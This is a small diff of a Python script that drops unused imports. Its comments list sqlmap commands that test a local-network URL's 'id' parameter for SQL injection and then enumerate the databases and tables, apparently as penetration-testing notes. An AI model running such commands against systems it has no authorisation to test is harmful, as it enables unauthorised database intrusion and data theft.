@@ -1,14 +1,9 @@
 __author__ = 'mannea'
 import os
 import os.path
-import sys
-import datetime
-import time
-import threading
-import xml.etree.ElementTree as ET
 
 #
-#  Check for vulnerable
+# Check for vulnerable
 #  sqlmap -u "http://192.168.1.120/products.php?id=1 "
 #  sqlmap -u "http://192.168.1.120/products.php?id=1 " --dbs
 #  sqlmap -u "http://192.168.1.120/products.php?id=1 " --tables [DATABASE]
